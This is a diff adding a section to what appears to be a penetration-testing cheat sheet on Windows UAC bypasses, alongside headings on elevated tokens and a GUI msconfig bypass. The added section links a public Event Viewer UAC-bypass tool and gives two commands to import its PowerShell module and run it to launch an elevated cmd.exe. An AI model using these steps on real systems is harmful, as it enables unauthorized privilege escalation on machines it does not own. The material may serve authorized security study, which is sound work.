@@ -20,6 +20,18 @@
 
 ### Elevated Token = Full admin privileges. High IL.
 
+# EventViewer
+
+Link: https://github.com/CsEnox/EventViewer-UACBypass
+
+### 1) Upload and import the module
+
+     Import-Module .\Invoke-EventViewer.ps1
+
+### 2) Run it
+
+     Invoke-EventViewer cmd.exe
+
 # GUI-BASED UAC BYPASS
 
 ## msconfig
